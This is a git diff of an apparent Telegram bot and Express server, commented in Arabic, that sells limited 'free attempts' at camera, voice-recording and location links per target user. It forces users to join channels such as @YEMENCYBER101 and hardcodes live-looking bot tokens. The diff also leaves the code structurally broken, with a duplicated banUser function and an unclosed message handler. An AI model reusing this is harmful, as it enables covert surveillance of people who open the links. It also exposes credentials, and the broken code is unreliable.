@@ -6,7 +6,7 @@ const fs = require('fs');
 const path = require('path');
 const useragent = require('useragent');
 
-const botToken = '7235293038:AAG9RdOV0AXcXxn32wY62njSc6wbPayjOvA';
+const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
 const bot = new TelegramBot(botToken, { polling: true });
 
 const app = express();
@@ -20,182 +20,209 @@ const upload = multer({ storage: storage });
 
 const platformVisits = {};
 const userVisits = {};
-const MAX_FREE_ATTEMPTS = 3; 
-const subscribedUsers = new Set(); 
-const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; 
+const MAX_FREE_ATTEMPTS = 3; // تحديد عدد المحاولات المجانية
+const subscribedUsers = new Set(); // مجموعة المستخدمين المشتركين
+const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; // رسالة نهاية الفترة التجريبية
 const adminId = '7130416076';
-const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101'];
+const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
 
-const allUsers = {};  // افترضت أن allUsers هو كائن موجود
-const activatedUsers = {};  // افترضت أن activatedUsers هو كائن موجود
-const bannedUsers = {};  // افترضت أن bannedUsers هو كائن موجود
+let allUsers = {}; // ستحتوي على جميع المستخدمين
+let bannedUsers = {}; 
+let activatedUsers = {};
+let userAttempts = {};
 
 function handleAdminCommands(chatId, text) {
-    try {
-        if (text.startsWith('/ban')) {
-            const userIdToBan = text.split(' ')[1];
-            if (userIdToBan) {
-                banUser(userIdToBan);
-                bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
-                recordBanAction(userIdToBan, chatId);
-            } else {
-                bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /ban <user_id>');
-            }
-            return true;
-        } else if (text.startsWith('/unban')) {
-            const userIdToUnban = text.split(' ')[1];
-            if (userIdToUnban) {
-                unbanUser(userIdToUnban);
-                bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
-            } else {
-                bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /unban <user_id>');
-            }
-            return true;
-        } else if (text === '/stats') {
-            const totalUsers = Object.keys(allUsers).length;
-            const activeUsers = Object.keys(activatedUsers).length;
-            const bannedUsersCount = Object.keys(bannedUsers).length;
-            const usersWhoBlockedBot = Object.values(allUsers).filter(user => user.hasBlockedBot).length;
+  try {
+    if (text.startsWith('/ban')) {
+      const userIdToBan = text.split(' ')[1];
+      if (userIdToBan) {
+        banUser(userIdToBan);
+        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
+        recordBanAction(userIdToBan, chatId); // سجل حظر المستخدم
+      } else {
+        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /ban <user_id>');
+      }
+      return true;
+    } else if (text.startsWith('/unban')) {
+      const userIdToUnban = text.split(' ')[1];
+      if (userIdToUnban) {
+        unbanUser(userIdToUnban);
+        bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
+      } else {
+        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /unban <user_id>');
+      }
+      return true;
+    } else if (text === '/stats') {
+      const totalUsers = Object.keys(allUsers).length;
+      const activeUsers = Object.keys(activatedUsers).length;
+      const bannedUsersCount = Object.keys(bannedUsers).length;
+      const usersWhoBlockedBot = Object.values(allUsers).filter(user => user.hasBlockedBot).length;
 
-            bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
-            return true;
-        } else if (text.startsWith('/sagd')) {
-            const message = text.slice('/sagd '.length);
-            if (message) {
-                broadcastMessage(message);
-                bot.sendMessage(chatId, 'تم إرسال الرسالة بنجاح!');
-            } else {
-                bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /broadcast <message>');
-            }
-            return true;
-        } else if (text === '/abo') {
-            const bannedUsersList = Object.keys(bannedUsers).join(', ');
-            bot.sendMessage(chatId, `قائمة المستخدمين المحظورين: ${bannedUsersList}`);
-            return true;
-        }
-    } catch (error) {
-        bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة الأمر. يرجى المحاولة لاحقًا.');
-        console.error('خطأ أثناء معالجة الأمر:', error);
+      bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
+      return true;
+    } else if (text.startsWith('/sagd')) {
+      const message = text.slice('/sagd '.length);
+      if (message) {
+        broadcastMessage(message);
+        bot.sendMessage(chatId, 'تم إرسال الرسالة بنجاح!');
+      } else {
+        bot.sendMessage(chatId, 'يرجى إدخال الأمر بالشكل التالي: /broadcast <message>');
+      }
+      return true;
+    } else if (text === '/abo') {
+      const bannedUsersList = Object.keys(bannedUsers).join(', ');
+      bot.sendMessage(chatId, `قائمة المستخدمين المحظورين: ${bannedUsersList}`);
+      return true;
     }
-    return false;
+  } catch (error) {
+    bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة الأمر. يرجى المحاولة لاحقًا.');
+    console.error('خطأ أثناء معالجة الأمر:', error);
+  }
+  return false;
 }
 
 function recordBanAction(userId, adminId) {
-    const adminName = getUsername(adminId);
-    bannedUsers[userId] = adminName;
-    saveData();
+  const adminName = getUsername(adminId); // استرجاع اسم المسؤول
+  bannedUsers[userId] = adminName; // تسجيل اسم المسؤول الذي قام بالحظر
+  saveData();
 }
 
+// دالة لاسترداد اسم المسؤول
 function getUsername(userId) {
-    return allUsers[userId]?.username || 'Unknown';
+  return allUsers[userId]?.username || 'Unknown';
 }
 
+// دالة لتحديث حالة حظر المستخدم للبوت
 function updateUserBlockStatus(userId, hasBlocked) {
-    if (allUsers[userId]) {
-        allUsers[userId].hasBlockedBot = hasBlocked;
-    } else {
-        allUsers[userId] = { hasBlockedBot: hasBlocked };
-    }
-    saveData();
+  if (allUsers[userId]) {
+    allUsers[userId].hasBlockedBot = hasBlocked;
+  } else {
+    allUsers[userId] = { hasBlockedBot: hasBlocked };
+  }
+  saveData();
 }
 
+// مستمع لحدث مغادرة العضو
 bot.on('left_chat_member', (msg) => {
-    const userId = msg.left_chat_member.id;
-    if (!msg.left_chat_member.is_bot) {
-        updateUserBlockStatus(userId, true);
-    }
+  const userId = msg.left_chat_member.id;
+  if (!msg.left_chat_member.is_bot) {
+    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
+  }
 });
 
+// مستمع لحظر البوت من قبل المستخدم
 bot.on('my_chat_member', (msg) => {
-    if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
-        const userId = msg.from.id;
-        updateUserBlockStatus(userId, true);
-    }
+  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
+    const userId = msg.from.id;
+    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
+  }
 });
 
+
+
+// دوال لحظر وإلغاء حظر المستخدمين
 function banUser(chatId) {
-    bannedUsers[chatId] = true;
-    saveData();
+  bannedUsers[chatId] = true;
+  saveData();
 }
 
 function unbanUser(chatId) {
-    delete bannedUsers[chatId];
-    saveData();
+  delete bannedUsers[chatId];
+  saveData();
 }
 
+// دالة لإرسال رسالة جماعية
 function broadcastMessage(message) {
-    Object.keys(allUsers).forEach((userId) => {
-        if (!bannedUsers[userId]) {
-            bot.sendMessage(userId, message).catch((error) => {
-                console.error(`فشل إرسال الرسالة إلى المستخدم ${userId}:`, error);
-            });
-        }
-    });
+  Object.keys(allUsers).forEach((userId) => {
+    if (!bannedUsers[userId]) {
+      bot.sendMessage(userId, message).catch((error) => {
+        console.error(`فشل إرسال الرسالة إلى المستخدم ${userId}:`, error);
+      });
+    }
+  });
 }
 
+// دالة لإضافة مستخدم إلى القائمة
 function addUser(user) {
-    if (!allUsers[user.id]) {
-        allUsers[user.id] = user;
-        saveData();
-    }
+  if (!allUsers[user.id]) {
+    allUsers[user.id] = user;
+    saveData();
+  }
 }
 
+// دالة لحظر مستخدم
+function banUser(userId) {
+  const user = allUsers[userId];
+  if (user && !bannedUsers[userId]) {
+    bannedUsers[userId] = user;
+    saveData();
+  }
+}
+
+// دالة لتفعيل مستخدم
 function activateUser(userId) {
-    const user = allUsers[userId];
-    if (user && !activatedUsers[userId]) {
-        activatedUsers[userId] = user;
-        saveData();
-    }
+  const user = allUsers[userId];
+  if (user && !activatedUsers[userId]) {
+    activatedUsers[userId] = user;
+    saveData();
+  }
 }
 
+// معالجة الرسائل الواردة
 bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text ? msg.text.toLowerCase() : '';
-    const senderId = msg.from.id;
-    const firstName = msg.from.first_name;
-    const lastName = msg.from.last_name || '';
-    const username = msg.from.username || '';
+  const chatId = msg.chat.id;
+  const text = msg.text ? msg.text.toLowerCase() : '';
+  const senderId = msg.from.id;
+  const firstName = msg.from.first_name;
+  const lastName = msg.from.last_name || '';
+  const username = msg.from.username || '';
 
-    if (!allUsers[chatId]) {
-        allUsers[chatId] = {
-            firstName: firstName,
-            lastName: lastName,
-            username: username
-        };
-        saveData();
-        bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${firstName} ${lastName}\nاسم المستخدم: @${username}\nمعرف الدردشة: ${chatId}`);
-    }
+  // تسجيل المستخدمين الجدد
+  if (!allUsers[chatId]) {
+    allUsers[chatId] = {
+      firstName: firstName,
+      lastName: lastName,
+      username: username
+    };
+    saveData();
+    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${firstName} ${lastName}\nاسم المستخدم: @${username}\nمعرف الدردشة: ${chatId}`);
+  }
 
-    if (senderId == adminId) {
-        if (handleAdminCommands(chatId, text)) return;
-    }
+  // معالجة أوامر المدير
+  if (senderId == adminId) {
+    if (handleAdminCommands(chatId, text)) return;
+  }
 
-    if (bannedUsers[chatId]) {
-        bot.sendMessage(chatId, 'لا يمكنك استخدام البوت مرة أخرى. \nإذا رغبت في استخدام البوت مرة أخرى، قُم بالتواصل مع المطور @SAGD112');
-        return;
-    }
+  // حظر المستخدمين المحظورين
+  if (bannedUsers[chatId]) {
+    bot.sendMessage(chatId, 'لا يمكنك استخدام البوت مرة أخرى. \nإذا رغبت في استخدام البوت مرة أخرى، قُم بالتواصل مع المطور @SAGD112');
+    return;
+  }
 
-    if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
-        for (const channel of forcedChannelUsernames) {
-            try {
-                const member = await bot.getChatMember(channel, chatId);
-                if (member.status === 'left' || member.status === 'kicked') {
-                    bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
-                        reply_markup: {
-                            inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-                        }
-                    });
-                    return;
-                }
-            } catch (error) {
-                console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-                bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+  // التحقق من عضوية القناة المطلوبة
+if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
+    for (const channel of forcedChannelUsernames) {
+        try {
+            const member = await bot.getChatMember(channel, chatId);
+            if (member.status === 'left' || member.status === 'kicked') {
+                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
+                    reply_markup: {
+                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
+                    }
+                });
                 return;
             }
+        } catch (error) {
+            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+            return;
         }
     }
-});
+}
 
+
+
+// دالة لتتبع المحاولات للمسارات الأخرى
 const trackAttempts = (userId, action) => {
     if (!userVisits[userId]) {
         userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
@@ -206,6 +233,7 @@ const trackAttempts = (userId, action) => {
     return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
 };
 
+// دالة لتتبع المحاولات لمسار المنصة الأصلي
 const trackPlatformAttempts = (platformId) => {
     if (!platformVisits[platformId]) {
         platformVisits[platformId] = 0;
@@ -216,6 +244,10 @@ const trackPlatformAttempts = (platformId) => {
     return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
 };
 
+// المسار الأصلي
+
+
+// مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
 
@@ -232,6 +264,7 @@ app.get('/camera/:userId', (req, res) => {
     res.sendFile(path.join(__dirname, 'location.html'));
 });
 
+// مسار تسجيل الصوت
 app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
 
